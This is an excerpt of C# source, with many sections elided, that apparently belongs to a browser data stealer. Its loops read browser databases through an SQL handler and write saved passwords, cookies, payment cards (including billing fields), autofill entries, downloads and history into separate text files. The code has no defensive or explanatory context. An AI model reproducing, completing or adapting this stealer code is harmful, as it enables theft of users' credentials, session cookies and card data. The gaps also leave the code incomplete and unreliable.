                        ...
                        foreach (var file in files)
                        {
                            try
                            {
                                if (File.Exists(file))
                                {
                                    ...
                                    if (true)
                                    {
                                        File.AppendAllText(path2save + "\\" + "Passwords" + ".txt", result);
                                    }
                        ...
                        foreach (var file in files)
                        {
                            try
                            {
                                ...
                                secure = sqlHandler.GetValue(rowNum, 6);
                                    ...
                                    if (true)
                                    {
                                        File.AppendAllText(path2save + "\\" + "Cookies" + ".txt", result);
                                    }
                        ...
                        foreach (var file in files)
                        {
                            try
                            {
                                ...
                                Billing = sqlHandler.GetValue(rowNum, 9);
                                    ...
                                    if (true)
                                    {
                                        File.AppendAllText(path2save + "\\" + "Cards" + ".txt", result);
                                    }
                    ...
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            ...
                            Value = sqlHandler.GetValue(rowNum, 1);
                                    ...
                                    if (true)
                                    {
                                        File.AppendAllText(path2save + "\\" + "Autofills" + ".txt", result);
                                    }
                    ...
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            ...
                            URL = sqlHandler.GetValue(rowNum, 15);
                                    ...
                                    File.WriteAllText(path2save + "\\" + "Downloads" + ".txt", result);
                                }
                            }
                            catch
                            {
                        ...
                        foreach (var file in files)
                        {
                            try
                            {
                                if (File.Exists(file))
                                {
                                    ...
                                    if (true)
                                    {
                                        File.AppendAllText(path2save + "\\" + "History" +  ".txt", result, Encoding.Default);
                                    }
